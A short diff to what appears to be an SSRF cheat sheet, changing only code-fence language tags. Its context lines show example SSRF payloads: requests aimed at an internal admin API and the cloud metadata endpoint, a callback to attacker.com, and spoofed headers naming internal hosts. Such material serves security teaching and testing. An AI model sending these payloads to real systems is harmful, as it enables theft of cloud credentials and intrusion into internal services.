@@ -45,7 +45,7 @@ Semi-Blind SSRF:
 ##### 3. Common SSRF Vectors
 
 URL Parameters:
-```http
+```
 GET /product/stock?url=http://internal-api.local/admin
 GET /fetch?url=http://169.254.169.254/latest/meta-data/
 POST /webhook&callback=http://attacker.com
@@ -66,7 +66,7 @@ PDF Generators:
 ```
 
 HTTP Headers:
-```http
+```
 Referer: http://internal-service.local
 X-Forwarded-For: http://internal-api
 ```
